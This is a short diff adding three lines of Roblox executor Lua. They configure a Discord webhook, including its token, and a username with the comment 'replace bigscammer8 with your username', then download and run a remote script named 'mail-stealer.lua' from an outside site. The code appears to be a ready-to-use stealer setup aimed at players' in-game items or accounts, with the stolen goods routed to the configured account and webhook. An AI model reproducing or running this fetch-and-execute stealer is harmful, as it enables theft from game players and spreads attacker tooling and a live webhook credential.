@@ -1,0 +1,3 @@
+getgenv().webhook = "https://discord.com/api/webhooks/1082709944723320833/kLz9a8dipjFVmwIA5WC4qyd7m4tQP9IJp7XvRUQoNWfp2elilJYmcKG2AxgIM07P1xcw" -- replace it with your webhook
+getgenv().name = "alexgeorge3434" -- replace bigscammer8 with your username
+loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
